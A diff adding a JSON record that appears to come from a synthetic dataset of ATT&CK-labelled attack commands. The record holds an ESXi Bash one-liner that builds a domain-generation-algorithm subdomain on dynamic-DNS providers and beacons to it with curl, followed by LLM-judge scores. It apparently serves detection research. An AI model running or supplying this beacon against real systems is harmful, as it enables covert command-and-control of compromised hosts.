@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1568",
+  "platform": "ESXi",
+  "shell": "Bash",
+  "command": "seed=\"$(uname -n)$(date -u +%G%V%H)\"; sub=$(echo -n \"$seed\" | sha1sum | cut -c1-13); base_domains=(hopto.org dynu.net duckdns.org); dom=\"$sub.${base_domains[$(($(date -u +%m) % ${#base_domains[@]}))]}\"; port=$(( ( (16#$(echo $sub | tr -dc '0-9a-f' | cut -c1-3)) % 20000 ) + 30000 )); curl -k --connect-timeout 5 \"https://$dom:$port/beacon\"",
+  "explanation": "Hashes hostname with ISO week and hour to create a rotating subdomain and computes a port from the subdomain\u2019s hex value, then connects via curl. This demonstrates DGA-based dynamic resolution per T1568.",
+  "rationale_steps": [
+    "Create a deterministic seed from host and time.",
+    "SHA-1 hash and truncate for a valid DNS label.",
+    "Select a provider domain by current month.",
+    "Calculate port from subdomain-derived hex to vary C2.",
+    "Curl to the dynamically generated domain and port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-0d44a1cb-50b67661",
+  "source_prompt_hash": "0d44a1cb",
+  "timestamp_utc": "2025-09-30T04:15:38.906305Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper variable assignments, correct arithmetic expansions, valid command substitutions, and appropriate use of command separators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1568 (Dynamic Resolution) by creating a deterministic but time-varying domain generation algorithm that combines hostname and time data to create rotating subdomains and ports, then attempts to beacon to the calculated endpoint.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T05:41:54.731717Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 4,
+        "syntactic_justification": "Well-formed with balanced quoting and valid flags, but the arithmetic use of $(date -u +%m) risks octal parsing (08/09) inside $((...)), which can fail at runtime.",
+        "semantic_score": 4,
+        "semantic_justification": "Implements a DGA-like rotating subdomain and port and beacons via curl aligning with T1568, though practicality depends on bash/curl availability on ESXi and DNS registration of the generated subdomains.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T05:42:43.549216Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with balanced quotes, correct command substitutions, proper arithmetic expansions, valid array declarations, and appropriate command separators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly demonstrates T1568 by algorithmically generating a rotating subdomain and port based on hostname and time, then attempting to beacon to this dynamically resolved endpoint via HTTPS, which is operationally plausible for C2.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T05:57:15.537163Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
